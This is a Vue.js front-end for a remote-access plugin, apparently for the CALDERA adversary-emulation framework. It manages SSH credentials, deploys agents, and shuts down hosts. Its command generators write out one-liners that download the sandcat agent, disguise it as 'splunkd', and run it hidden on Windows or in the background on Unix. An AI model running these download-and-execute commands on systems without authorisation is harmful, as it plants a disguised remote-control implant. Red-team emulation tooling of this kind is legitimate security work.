new Vue({
    el: '#remoteaccess-app',
    data: {
        credentials: {},
        newCredential: {
            host: '',
            username: '',
            password: '',
            key_file: '',
            port: 22
        },
        deployment: {
            host: '',
            agentType: 'red',
            platform: 'windows'
        },
        selectedHost: '',
        systemInfo: null,
        results: null,
        showRemoveModal: false,
        removeHost: '',
        hostsWithAgents: [],
        showTestModal: false,
        testResults: null,
        calderaConfig: {
            server: 'http://localhost:8888'
        }
    },
    async mounted() {
        await this.loadCredentials();
        await this.loadHostsWithAgents();
    },
    methods: {
        async loadCredentials() {
            try {
                const response = await fetch('/plugin/remoteaccess/credentials');
                if (response.ok) {
                    this.credentials = await response.json();
                } else {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
            } catch (error) {
                console.error('Failed to load credentials:', error);
                this.showError('Failed to load credentials: ' + error.message);
            }
        },
        
        async addCredential() {
            if (!this.newCredential.host || !this.newCredential.username) {
                this.showError('Host and username are required');
                return;
            }
            
            if (!this.newCredential.port) {
                this.newCredential.port = 22;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/credentials', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.newCredential)
                });
                
                if (response.ok) {
                    this.newCredential = { host: '', username: '', password: '', key_file: '', port: 22 };
                    await this.loadCredentials();
                    this.results = { success: true, message: 'Credential added successfully' };
                } else {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
            } catch (error) {
                this.showError('Failed to add credential: ' + error.message);
            }
        },
        
        async removeCredential(host) {
            if (confirm(`Are you sure you want to remove credentials for ${host}?`)) {
                try {
                    const response = await fetch('/plugin/remoteaccess/credentials', {
                        method: 'DELETE',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ host })
                    });
                    
                    if (response.ok) {
                        await this.loadCredentials();
                        this.results = { success: true, message: 'Credential removed successfully' };
                    } else {
                        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    }
                } catch (error) {
                    this.showError('Failed to remove credential: ' + error.message);
                }
            }
        },
        
        async deployAgent() {
            if (!this.deployment.host) {
                this.showError('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/deploy', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(this.deployment)
                });
                
                this.results = await response.json();
                await this.loadHostsWithAgents();
            } catch (error) {
                this.showError('Deployment failed: ' + error.message);
            }
        },
        
        async getSystemInfo() {
            if (!this.selectedHost) {
                this.showError('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/host', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        host: this.selectedHost,
                        action: 'info'
                    })
                });
                
                this.systemInfo = await response.json();
            } catch (error) {
                this.showError('Failed to get system info: ' + error.message);
            }
        },
        
        async shutdownHost() {
            if (!this.selectedHost || !confirm(`🚨 ARE YOU SURE YOU WANT TO SHUTDOWN ${this.selectedHost}? 🚨\n\nThis action cannot be undone!`)) {
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/host', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        host: this.selectedHost,
                        action: 'shutdown'
                    })
                });
                
                this.results = await response.json();
            } catch (error) {
                this.showError('Shutdown failed: ' + error.message);
            }
        },
        
        async showRemoveAgentsModal() {
            await this.loadHostsWithAgents();
            this.showRemoveModal = true;
        },
        
        async loadHostsWithAgents() {
            try {
                const response = await fetch('/plugin/remoteaccess/hosts');
                if (response.ok) {
                    const hostsData = await response.json();
                    this.hostsWithAgents = Object.keys(hostsData);
                }
            } catch (error) {
                console.error('Failed to load hosts with agents:', error);
            }
        },
        
        async removeAgents() {
            if (!this.removeHost) {
                this.showError('Please select a host');
                return;
            }
            
            if (!confirm(`Remove all agents from ${this.removeHost}?`)) {
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/remove', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host: this.removeHost })
                });
                
                this.results = await response.json();
                this.showRemoveModal = false;
                this.removeHost = '';
                await this.loadHostsWithAgents();
            } catch (error) {
                this.showError('Failed to remove agents: ' + error.message);
            }
        },
        
        async testConnection(host = null) {
            const testHost = host || this.selectedHost;
            if (!testHost) {
                this.showError('Please select a host');
                return;
            }
            
            try {
                const response = await fetch('/plugin/remoteaccess/test', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ host: testHost })
                });
                
                this.testResults = await response.json();
                this.showTestModal = true;
            } catch (error) {
                this.testResults = { error: 'Connection test failed: ' + error.message };
                this.showTestModal = true;
            }
        },
        
        async showDeploymentCommand() {
            if (!this.deployment.host) {
                this.showError('Please select a host');
                return;
            }
            
            const platform = this.deployment.platform;
            const agentType = this.deployment.agentType;
            
            let command = '';
            if (platform === 'windows') {
                command = this._generateWindowsCommand(agentType);
            } else {
                command = this._generateUnixCommand(agentType, platform);
            }
            
            this.results = {
                command_preview: command,
                note: 'This command will be executed on the remote host via SSH'
            };
        },
        
        _generateWindowsCommand(agentType) {
            return `$server="${this.calderaConfig.server}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\\\Users\\\\Public\\\\splunkd.exe"} | stop-process -f;rm -force "C:\\\\Users\\\\Public\\\\splunkd.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\\\Users\\\\Public\\\\splunkd.exe",$data) | Out-Null;Start-Process -FilePath C:\\\\Users\\\\Public\\\\splunkd.exe -ArgumentList "-server $server -group ${agentType}" -WindowStyle hidden`;
        },
        
        _generateUnixCommand(agentType, platform) {
            const platformHeader = platform === 'macos' ? 'darwin' : 'linux';
            return `server="${this.calderaConfig.server}"; curl -s -X POST -H "file:sandcat.go" -H "platform:${platformHeader}" $server/file/download > splunkd; chmod +x splunkd; ./splunkd -server $server -group ${agentType} -v &`;
        },
        
        copyToClipboard(text) {
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(() => {
                    this.showSuccess('Command copied to clipboard!');
                }).catch(err => {
                    this._fallbackCopyToClipboard(text);
                });
            } else {
                this._fallbackCopyToClipboard(text);
            }
        },
        
        _fallbackCopyToClipboard(text) {
            const textArea = document.createElement('textarea');
            textArea.value = text;
            textArea.style.position = 'fixed';
            textArea.style.opacity = '0';
            document.body.appendChild(textArea);
            textArea.select();
            try {
                document.execCommand('copy');
                this.showSuccess('Command copied to clipboard!');
            } catch (err) {
                this.showError('Failed to copy command to clipboard');
            }
            document.body.removeChild(textArea);
        },
        
        showError(message) {
            alert('Error: ' + message);
        },
        
        showSuccess(message) {
            // Could be replaced with a toast notification
            console.log('Success:', message);
        }
    }
});
